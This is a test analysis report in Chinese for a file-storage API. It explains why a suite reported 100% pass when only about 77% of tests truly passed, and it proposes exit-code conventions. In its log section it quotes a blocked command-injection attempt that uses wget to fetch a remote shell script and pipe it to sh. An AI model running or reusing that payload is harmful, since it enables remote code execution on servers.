# 测试问题分析报告

## 日期：2025-11-20

## 发现的问题

### 1. 差分同步测试 (test_delta_sync.sh) - 实际失败 ❌

**现象：**
```
HTTP 状态码: 400
响应内容: {"success":false,"message":"文件不存在","code":"FILE_NOT_FOUND"}
[PASS] test_delta_sync.sh (1s)
```

**根本原因：**
- 测试使用了 `$UPLOADED_FILE_ID` 变量，该变量指向之前上传的文件
- 但在测试序列中，"文件删除测试" (test_file_delete.sh) 已经删除了该文件
- 差分同步测试运行时，文件已不存在

**影响：**
- 测试标记为通过，但实际上API没有被正确测试
- 差分同步功能未得到验证

**修复方案：** ✅ 已修复
- 让测试自己上传一个5MB的大文件（足以触发分块存储）
- 不依赖其他测试的文件
- 如果文件太小未分块，测试会优雅地跳过（exit 0）

---

### 2. 断点续传测试 (test_resumable_upload.sh) - 不完整 ⚠️

**现象：**
```
步骤 1: 初始化断点续传会话
✓ 会话初始化成功
Session ID: xxx
总块数: 3

步骤 2: 上传文件分块
上传块 0: 偏移=0, 大小=2097152 字节
  块 0 上传成功 (已上传 1/3)
[PASS] test_resumable_upload.sh (6s)
```

**根本原因：**
- 测试脚本包含完整的上传逻辑（初始化 → 上传所有块 → 完成合并）
- 但只执行了第一个块的上传就退出了
- 可能原因：
  1. 测试框架对单个测试有时间限制（超时）
  2. bash 循环逻辑在 WSL 环境下有问题
  3. 脚本被测试框架强制中断

**影响：**
- 断点续传功能的核心部分（上传多个块、完成合并）未被测试
- 测试标记为通过，但只测试了不到1/3的功能

**建议修复方案：**
1. 增加测试超时时间
2. 简化测试文件大小（从5MB减少到3MB）
3. 添加调试输出查看循环是否正常执行
4. 或者拆分成多个小测试：
   - test_resumable_init.sh（初始化会话）
   - test_resumable_chunk.sh（上传单个块）
   - test_resumable_complete.sh（完成上传）

---

### 3. 块级去重测试 (test_chunk_deduplication.sh) - 测试无效 ⚠️

**现象：**
```
文件1: chunk_test1_xxx.txt (大小: 38392 字节)
文件2: chunk_test2_xxx.txt (大小: 38392 字节)
预计块数: 1
✓ 测试通过: 块级去重测试
块级去重功能已测试（实际验证需要检查数据库）
```

**根本原因：**
- 测试文件只有38KB，远小于块大小阈值（4MB）
- 系统不会对小文件进行分块存储
- 因此块级去重逻辑根本不会被触发
- 测试实际上只验证了"两个小文件都能上传成功"

**影响：**
- 块级去重功能完全未被测试
- 测试结果具有误导性

**修复方案：** ✅ 已修复
- 将测试文件大小改为5MB（使用 `dd` 或 Python 生成）
- 确保文件会被分块（至少2-3个块）
- 两个文件内容完全相同，触发块级去重
- 理想情况下，应该查询数据库验证 `ref_count > 1`

---

### 4. 测试框架设计问题 🔧

**问题：**
- 很多测试使用 `exit 0` 来跳过未实现的功能
- 导致"跳过"、"部分失败"和"真正成功"都被标记为 PASS
- 没有区分 PASS（测试通过）、SKIP（功能未实现）、WARN（部分成功）

**示例：**
```bash
if [ "$HTTP_CODE" != "200" ]; then
    echo -e "${YELLOW}⚠ 功能可能未实现${NC}"
    exit 0  # 这应该是 exit 2 (SKIP) 而不是 exit 0 (PASS)
fi
```

**建议改进：**
- 定义退出码规范：
  - `0` = PASS（测试完全通过）
  - `1` = FAIL（测试失败）
  - `2` = SKIP（功能未实现/测试跳过）
  - `3` = WARN（部分成功/需要人工验证）
- 修改测试框架识别不同退出码
- 在报告中区分显示

---

## 服务器日志分析

从服务器日志 (app.log) 中观察到：

1. **正常运行迹象：**
   - S3 连接正常（TLS 握手成功）
   - 数据库查询正常（Hibernate SQL）
   - 断点续传会话清理定时任务在运行

2. **安全问题：** ⚠️
   ```
   Invalid character found in the request target
   [/cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh...]
   ```
   - 有恶意攻击尝试（wget 下载脚本）
   - Tomcat 正确拦截了攻击
   - **建议：配置防火墙/CDN 过滤恶意流量**

3. **登录失败记录：**
   ```
   00:24:02.862 INFO Login attempt for 2120320012@qq.com
   00:24:02.941 WARN Business exception: 用户名或密码错误
   ```
   - 可能是测试账号密码错误
   - 或者是暴力破解尝试
   - **建议：添加登录失败次数限制**

---

## 测试通过率真实情况

**报告显示：**
```
总测试数: 13
通过: 13
失败: 0
成功率: 100%
```

**实际情况：**
```
真正通过: 10 (77%)
部分通过: 1  (断点续传 - 只完成了初始化和第一块上传)
未实际测试: 2 (差分同步、块级去重 - 测试条件不满足)
```

**实际成功率：约 77%**

---

## 修复状态

- [x] 差分同步测试 - 已修复，使用独立的大文件
- [x] 块级去重测试 - 已修复，使用5MB文件
- [ ] 断点续传测试 - 需要进一步调查（可能是超时问题）
- [ ] 测试框架 - 建议引入退出码规范

---

## 建议后续行动

1. **立即行动：**
   - 运行修复后的测试，验证差分同步和块级去重
   - 调查断点续传测试为何只上传一个块

2. **短期改进：**
   - 为测试文件添加清理逻辑（避免占用存储空间）
   - 添加数据库查询验证块级去重效果
   - 增加测试超时配置

3. **长期改进：**
   - 重构测试框架，引入退出码规范
   - 添加性能测试（大文件上传速度、并发测试）
   - 添加压力测试（模拟多用户同时上传）

---

生成时间：2025-11-20
分析工具：人工审查 + 日志分析



